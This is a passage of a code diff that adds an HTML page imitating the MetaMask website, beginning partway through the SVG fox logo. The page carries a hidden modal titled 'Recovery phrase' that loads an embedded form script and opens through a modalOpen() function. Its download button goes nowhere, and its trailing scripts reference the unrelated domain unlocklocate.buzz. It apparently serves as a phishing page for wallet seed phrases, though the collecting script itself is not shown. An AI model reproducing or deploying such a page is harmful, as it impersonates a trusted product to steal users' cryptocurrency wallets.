35.687158703804016,101.15490604192019"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="167.52656251192093,105.01490499824286 194.31284129619598,101.15490604192019 208.2338860630989,142.16510832309723"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="31.243604123592377,88.6357069015503 25.573697984218597,83.18096116185188 30.089588463306427,79.91348698735237"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="198.75639587640762,88.6357069015503 199.91041153669357,79.91348698735237 204.4263020157814,83.18096116185188"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="56.30186170339584,138.64897564053535 21.766113936901093,142.16510832309723 62.47343748807907,105.01490499824286"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="167.52656251192093,105.01490499824286 208.2338860630989,142.16510832309723 173.69813829660416,138.64897564053535"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="21.766113936901093,142.16510832309723 56.30186170339584,138.64897564053535 75.56591644883156,170.03321766853333"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="154.43408355116844,170.03321766853333 173.69813829660416,138.64897564053535 208.2338860630989,142.16510832309723"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="35.687158703804016,101.15490604192019 27.549791634082794,91.1219783872366 31.243604123592377,88.6357069015503"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="194.31284129619598,101.15490604192019 198.75639587640762,88.6357069015503 202.4502083659172,91.1219783872366"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="28.350031077861786,72.64967888593674 23.04548531770706,42.60079950094223 62.13241755962372,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="167.86758244037628,48.80859464406967 206.95451468229294,42.60079950094223 201.6499689221382,72.64967888593674"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="35.687158703804016,101.15490604192019 74.26758199930191,90.29880195856094 62.47343748807907,105.01490499824286"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="194.31284129619598,101.15490604192019 167.52656251192093,105.01490499824286 155.7324180006981,90.29880195856094"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="74.26758199930191,90.29880195856094 101.474947668612,66.50649458169937 103.77633009105921,105.72141297161579"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="103.77633009105921,105.72141297161579 62.47343748807907,105.01490499824286 74.26758199930191,90.29880195856094"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="155.7324180006981,90.29880195856094 167.52656251192093,105.01490499824286 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="126.22366990894079,105.72141297161579 128.525052331388,66.50649458169937 155.7324180006981,90.29880195856094"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="32.800844609737396,14.82413649559021 101.474947668612,66.50649458169937 62.13241755962372,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="197.1991553902626,14.82413649559021 206.95451468229294,42.60079950094223 167.86758244037628,48.80859464406967"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="62.13241755962372,48.80859464406967 23.04548531770706,42.60079950094223 32.800844609737396,14.82413649559021"></polygon><polygon fill="rgb(118,61,22)" stroke="rgb(118,61,22)" points="167.86758244037628,48.80859464406967 128.525052331388,66.50649458169937 197.1991553902626,14.82413649559021"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="101.474947668612,66.50649458169937 128.525052331388,66.50649458169937 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="126.22366990894079,105.72141297161579 103.77633009105921,105.72141297161579 101.474947668612,66.50649458169937"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="75.56591644883156,170.03321766853333 56.30186170339584,138.64897564053535 79.43150356411934,137.96676956117153"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="154.43408355116844,170.03321766853333 150.56849643588066,137.96676956117153 173.69813829660416,138.64897564053535"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="78.99384841322899,121.26653036102653 62.47343748807907,105.01490499824286 103.77633009105921,105.72141297161579"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="126.22366990894079,105.72141297161579 167.52656251192093,105.01490499824286 151.006151586771,121.26653036102653"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="62.47343748807907,105.01490499824286 79.43150356411934,137.96676956117153 56.30186170339584,138.64897564053535"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="173.69813829660416,138.64897564053535 150.56849643588066,137.96676956117153 167.52656251192093,105.01490499824286"></polygon><polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)" points="62.47343748807907,105.01490499824286 78.99384841322899,121.26653036102653 79.43150356411934,137.96676956117153"></polygon><polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)" points="167.52656251192093,105.01490499824286 150.56849643588066,137.96676956117153 151.006151586771,121.26653036102653"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="83.7541475892067,175.32437652349472 75.56591644883156,170.03321766853333 99.19052764773369,174.56743717193604"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="130.8094723522663,174.56743717193604 154.43408355116844,170.03321766853333 146.2458524107933,175.32437652349472"></polygon><polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="99.02896113693714,166.03881672024727 99.19052764773369,174.56743717193604 75.56591644883156,170.03321766853333"></polygon><polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="130.97103886306286,166.03881672024727 154.43408355116844,170.03321766853333 130.8094723522663,174.56743717193604"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="101.07625968754292,149.0042231976986 75.56591644883156,170.03321766853333 79.43150356411934,137.96676956117153"></polygon><polygon fill="rgb(228,118,27)" stroke="rgb(228,118,27)" points="128.92374031245708,149.0042231976986 150.56849643588066,137.96676956117153 154.43408355116844,170.03321766853333"></polygon><polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="75.56591644883156,170.03321766853333 101.07625968754292,149.0042231976986 99.02896113693714,166.03881672024727"></polygon><polygon fill="rgb(215,193,179)" stroke="rgb(215,193,179)" points="154.43408355116844,170.03321766853333 130.97103886306286,166.03881672024727 128.92374031245708,149.0042231976986"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="103.77633009105921,105.72141297161579 93.79213474690914,114.40585085423663 78.99384841322899,121.26653036102653"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="151.006151586771,121.26653036102653 136.20786525309086,114.40585085423663 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="79.43150356411934,137.96676956117153 78.99384841322899,121.26653036102653 99.8763357847929,126.66119568049908"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="150.56849643588066,137.96676956117153 130.1236642152071,126.66119568049908 151.006151586771,121.26653036102653"></polygon><polygon fill="rgb(35,52,71)" stroke="rgb(35,52,71)" points="99.8763357847929,126.66119568049908 78.99384841322899,121.26653036102653 93.79213474690914,114.40585085423663"></polygon><polygon fill="rgb(35,52,71)" stroke="rgb(35,52,71)" points="130.1236642152071,126.66119568049908 136.20786525309086,114.40585085423663 151.006151586771,121.26653036102653"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="93.79213474690914,114.40585085423663 103.77633009105921,105.72141297161579 99.8763357847929,126.66119568049908"></polygon><polygon fill="rgb(205,97,22)" stroke="rgb(205,97,22)" points="136.20786525309086,114.40585085423663 130.1236642152071,126.66119568049908 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="104.67845190316439,118.10203121043742 103.77633009105921,105.72141297161579 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="126.22366990894079,105.72141297161579 125.32154809683561,118.10203121043742 104.67845190316439,118.10203121043742"></polygon><polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)" points="99.8763357847929,126.66119568049908 103.77633009105921,105.72141297161579 104.67845190316439,118.10203121043742"></polygon><polygon fill="rgb(226,118,27)" stroke="rgb(226,118,27)" points="130.1236642152071,126.66119568049908 125.32154809683561,118.10203121043742 126.22366990894079,105.72141297161579"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="99.19052764773369,174.56743717193604 100.57424902915955,181.5959668159485 83.7541475892067,175.32437652349472"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="146.2458524107933,175.32437652349472 129.42575097084045,181.5959668159485 130.8094723522663,174.56743717193604"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="101.07625968754292,149.0042231976986 79.43150356411934,137.96676956117153 99.8763357847929,126.66119568049908"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="130.1236642152071,126.66119568049908 150.56849643588066,137.96676956117153 128.92374031245708,149.0042231976986"></polygon><polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)" points="104.67845190316439,118.10203121043742 104.66902520507574,146.5012489259243 99.8763357847929,126.66119568049908"></polygon><polygon fill="rgb(228,117,31)" stroke="rgb(228,117,31)" points="125.32154809683561,118.10203121043742 130.1236642152071,126.66119568049908 125.33097479492426,146.5012489259243"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="99.8763357847929,126.66119568049908 104.66902520507574,146.5012489259243 101.07625968754292,149.0042231976986"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="128.92374031245708,149.0042231976986 125.33097479492426,146.5012489259243 130.1236642152071,126.66119568049908"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="104.67845190316439,118.10203121043742 125.32154809683561,118.10203121043742 125.33097479492426,146.5012489259243"></polygon><polygon fill="rgb(246,133,27)" stroke="rgb(246,133,27)" points="125.33097479492426,146.5012489259243 104.66902520507574,146.5012489259243 104.67845190316439,118.10203121043742"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="100.57424902915955,181.5959668159485 99.19052764773369,174.56743717193604 99.02896113693714,166.03881672024727"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="130.97103886306286,166.03881672024727 130.8094723522663,174.56743717193604 129.42575097084045,181.5959668159485"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="99.02896113693714,166.03881672024727 100.88272791355848,163.6574624478817 100.57424902915955,181.5959668159485"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="100.57424902915955,181.5959668159485 100.88272791355848,163.6574624478817 129.11727208644152,163.6574624478817"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="129.11727208644152,163.6574624478817 129.42575097084045,181.5959668159485 100.57424902915955,181.5959668159485"></polygon><polygon fill="rgb(192,173,158)" stroke="rgb(192,173,158)" points="129.42575097084045,181.5959668159485 129.11727208644152,163.6574624478817 130.97103886306286,166.03881672024727"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="100.88272791355848,163.6574624478817 99.02896113693714,166.03881672024727 101.07625968754292,149.0042231976986"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="128.92374031245708,149.0042231976986 130.97103886306286,166.03881672024727 129.11727208644152,163.6574624478817"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="104.47288013994694,148.6215277016163 104.66902520507574,146.5012489259243 125.33097479492426,146.5012489259243"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="125.33097479492426,146.5012489259243 125.52711986005306,148.6215277016163 104.47288013994694,148.6215277016163"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="101.07625968754292,149.0042231976986 104.66902520507574,146.5012489259243 104.47288013994694,148.6215277016163"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="125.52711986005306,148.6215277016163 125.33097479492426,146.5012489259243 128.92374031245708,149.0042231976986"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="101.07625968754292,149.0042231976986 102.17400904744864,151.21694907546043 100.88272791355848,163.6574624478817"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="104.47288013994694,148.6215277016163 102.17400904744864,151.21694907546043 101.07625968754292,149.0042231976986"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="129.11727208644152,163.6574624478817 127.82599095255136,151.21694907546043 128.92374031245708,149.0042231976986"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="128.92374031245708,149.0042231976986 127.82599095255136,151.21694907546043 125.52711986005306,148.6215277016163"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="102.17400904744864,151.21694907546043 127.82599095255136,151.21694907546043 129.11727208644152,163.6574624478817"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="129.11727208644152,163.6574624478817 100.88272791355848,163.6574624478817 102.17400904744864,151.21694907546043"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="125.52711986005306,148.6215277016163 127.82599095255136,151.21694907546043 102.17400904744864,151.21694907546043"></polygon><polygon fill="rgb(22,22,22)" stroke="rgb(22,22,22)" points="102.17400904744864,151.21694907546043 104.47288013994694,148.6215277016163 125.52711986005306,148.6215277016163"></polygon></svg></div>
+    <div class="container-3 w-container">
+      <h2 class="cta-heading inline-block">Get started</h2>
+    </div>
+    <a href="#" class="button blue-button-solid button-large">Download MetaMask
+      Today</a>
+  </div>
+  <div class="section light-gray-bg wf-section">
+    <div class="container-6 w-container">
+      <div class="section-title-group w-clearfix">
+        <h2 class="section-heading">Your key to blockchain applications</h2>
+        <div class="section-subheading center h5">MetaMask provides an essential utility for blockchain newcomers, token
+          traders, crypto gamers, and developers. Over a million downloads and counting!</div>
+      </div>
+      <div class="w-layout-grid grid-3"><img src="./metamask_files/dapp-aave.png" sizes="(max-width: 479px) 92vw, (max-width: 602px) 93vw, 560px" srcset="./metamask_files/dapp-aave-p-500.png 500w, ./metamask_files/dapp-aave.png 560w" alt="Aave logo"><img src="./metamask_files/dapp-axieinfinity.png" sizes="(max-width: 479px) 92vw, (max-width: 602px) 93vw, 560px" srcset="./metamask_files/dapp-axieinfinity-p-500.png 500w, ./metamask_files/dapp-axieinfinity.png 560w" alt="Axie Infinity Logo"><img src="./metamask_files/dapp-compound.png" alt="Compound logo
+"><img src="./metamask_files/dapp-gitcoin.png" alt="Gitcoin logo"><img src="./metamask_files/dapp-maker.png" alt="Maker logo"><img src="./metamask_files/dapp-opensea.png" alt="Opensea Logo
+"><img src="./metamask_files/dapp-rarible.png" alt="Rarible Logo"><img src="./metamask_files/dapp-uniswap.png" alt="Uniswap Logo"></div>
+    </div>
+  </div>
+  <div class="section-3 wf-section">
+    <div class="container-7 w-container">
+      <h2 class="cta-heading inline-block">Developers</h2>
+      <div class="section-subheading white center h4">MetaMask is powered by a strong community from across the globe.
+        Interested in contributing? Find out how and what to contribute using the resources below.</div>
+      <a href="https://github.com/MetaMask/metamask-extension/issues" target="_blank" class="link-block w-inline-block">
+        <div class="text-block-26">Open Issues &gt;</div>
+      </a>
+      <a href="https://gitcoin.co/metamask/active" target="_blank" class="link-block w-inline-block">
+        <div class="text-block-26">Open Bounties &gt;</div>
+      </a>
+      <a href="https://metamask.github.io/metamask-docs/" target="_blank" class="link-block w-inline-block">
+        <div class="text-block-26">Documentation &gt;</div>
+      </a>
+      <a href="https://github.com/MetaMask/metamask-extension/blob/739b5dfe72dad93f97603a22e61632a2ae872c84/.github/CONTRIBUTING.md" target="_blank" class="link-block w-inline-block">
+        <div class="text-block-26">Contributing Guidelines &gt;</div>
+      </a>
+    </div>
+  </div>
+  <div class="section-4 section shop wf-section">
+    <div class="container-8 w-container">
+      <div class="columns-2 w-row">
+        <div class="w-col w-col-5"><img src="./metamask_files/mm-shop-hoodie.png" sizes="(max-width: 479px) 87vw, (max-width: 767px) 45vw, (max-width: 991px) 291.65625px, 380px" srcset="./metamask_files/mm-shop-hoodie-p-500.png 500w, ./metamask_files/mm-shop-hoodie.png 786w" alt="Image of a black hoodie with MetaMask artwork printed on it"></div>
+        <div class="w-col w-col-7">
+          <h2 class="heading-18">Shop MetaMask Swag</h2>
+          <a rel="noreferer, noopener" href="https://shop.spreadshirt.com/metamask/" target="_blank" class="hollow-button w-button">Shop Now</a>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="section newsletter wf-section">
+    <div class="container-20 w-container">
+      <h2 class="heading-14">Receive our Newsletter</h2>
+      <p class="paragraph-4">Sign up to receive updates and announcements</p>
+      <a href="https://metamask.io/#" data-w-id="06d857cc-ded7-495b-d399-bf0589c25527" class="button standard-button">Sign up</a>
+    </div>
+  </div>
+  <div data-w-id="f28e67e0-be54-a43b-c875-045d3e6a7e92" class="modal-wrapper" id="modalHere" style="display: none; opacity: 0;">
+    <div class="sign-up-form">
+      <div class="div-block-16">
+        <h2 class="modal-heading">Recovery phrase</h2>
+        <div data-w-id="ee6262fc-4b4a-154a-939c-590d16c36847" class="close-modal-button"><img src="./metamask_files/mm-close-black.svg" loading="lazy" width="30" height="30" alt="" class="image-17">
+        </div>
+      </div>
+      <div class="html-embed-2 w-embed w-script">
+        <!-- [if lte IE 8]><script charset="utf-8" type="text/javascript" src="https://js.hsforms.net/forms/v2-legacy.js"></script><![endif] -->
+        <script charset="utf-8" type="text/javascript" src="./metamask_files/v2.js.download"></script>
+        
+      </div>
+    </div>
+  </div>
+  <div class="footer accent wf-section">
+    <div class="container-9 w-container"><img src="./metamask_files/mm-logo.svg" alt=""></div>
+    <div class="w-container">
+      <div class="columns-6 w-row">
+        <div class="column-3 partnership w-col w-col-3">
+          <h5 class="heading-6 orange-text">LEGAL</h5>
+          <a href="https://consensys.net/privacy-policy/" rel="noreferer, noopener" target="_blank" class="footer-link">Privacy Policy</a>
+          <a href="https://consensys.net/terms-of-use/" rel="noreferer, noopener" target="_blank" class="footer-link">Terms of Use</a>
+          <a href="https://metamask.io/cla.html" class="footer-link">Contributor License Agreement</a>
+          <a href="https://metamask.io/sitemap.html" class="footer-link">Site Map</a>
+        </div>
+        <div class="column-3 w-col w-col-3">
+          <h5 class="heading-6 orange-text">LEARN&nbsp;MORE</h5>
+          <a href="https://metamask.io/about.html" class="footer-link">About</a>
+          <a href="https://docs.metamask.io/guide/" rel="noreferer, noopener" target="_blank" class="footer-link">Developers</a>
+          <a href="https://metamask.io/download.html" class="footer-link">Download</a>
+          <a href="https://metamask.github.io/metamask-docs/" rel="noreferer, noopener" target="_blank" class="footer-link">Documentation</a>
+          <a href="https://metamask.io/institutions.html" rel="noreferer, noopener" class="footer-link">MetaMask
+            Institutional</a>
+        </div>
+        <div class="column-3 w-col w-col-3">
+          <h5 class="heading-6 orange-text">GET&nbsp;INVOLVED</h5>
+          <a href="https://github.com/MetaMask/metamask-extension" rel="noreferer, noopener" target="_blank" class="footer-link">GitHub</a>
+          <a href="https://gitcoin.co/metamask/" rel="noreferer, noopener" target="_blank" class="footer-link">Gitcoin</a>
+          <a href="https://consensys.net/open-roles/?discipline=32543" rel="noreferer, noopener" target="_blank" class="footer-link">Open&nbsp;Positions</a>
+          <a href="https://shop.spreadshirt.com/metamask/" rel="noreferer, noopener" target="_blank" class="footer-link">Swag Shop</a>
+          <a href="https://metamask.zendesk.com/hc/en-us/requests/new?ticket_form_id=360001539191" rel="noreferer, noopener" target="_blank" class="footer-link">Press &amp;&nbsp;Partnerships</a>
+        </div>
+        <div class="column-5 w-col w-col-3">
+          <h5 class="heading-6 orange-text">CONNECT</h5>
+          <a href="https://metamask.io/faqs.html" class="footer-link">FAQs</a>
+          <a href="https://community.metamask.io/" rel="noreferer, noopener" target="_blank" class="footer-link">Support</a>
+          <a href="https://medium.com/metamask" rel="noreferer, noopener" target="_blank" class="footer-link">Blog</a>
+          <a href="https://twitter.com/metamask" rel="noreferer, noopener" target="_blank" class="footer-link">Twitter</a>
+        </div>
+      </div>
+    </div>
+    <div class="container-19 w-container"></div>
+    <div class="container-10 w-container">
+      <p class="paragraph footer-legal">©2021 MetaMask • A ConsenSys Formation</p>
+    </div>
+  </div>
+  <script src="./metamask_files/jquery-3.5.1.min.dc5e7f18c8.js.download" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="./metamask_files/webflow.js.download" type="text/javascript"></script>
+  <!-- [if lte IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/placeholders/3.0.2/placeholders.min.js"></script><![endif] -->
+  <script>
+    document.getElementById("downloadButtonNav").onclick = function () {
+      if (gtag) {
+        gtag('event', 'Click', {
+          'event_category': 'Download',
+          'event_label': 'Nav Bar Button'
+        });
+      }
+    }
+
+    function modalOpen() {
+      document.getElementById("modalHere").style.display = "flex";
+      document.getElementById("modalHere").style.opacity = "1";
+    }
+  </script>
+
+
+  <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
+    <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;">
+    </div>
+    <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"></div>
+  </div>
+  <script id="lpSS_81425771444" src="./metamask_files/storage.secure.min.js.download"></script><script id="lpSS_18493923121" src="https://lpcdn.lpsnmedia.net/le_secure_storage/3.15.0.0-release_5063/storage.secure.min.js?loc=https%3A%2F%2Funlocklocate.buzz&amp;site=88982875&amp;force=1&amp;env=prod"></script><iframe tabindex="-1" aria-hidden="true" role="presentation" title="Intentionally blank" name="lpSS_29041367967" id="lpSS_29041367967" src="https://lpcdn.lpsnmedia.net/le_secure_storage/3.15.0.0-release_5063/storage.secure.min.html?loc=https%3A%2F%2Funlocklocate.buzz&amp;site=88982875&amp;env=prod" style="width: 0px; height: 0px; position: absolute; top: -1000px; left: -1000px; display: none;"></iframe>
+
+
+</body></html>
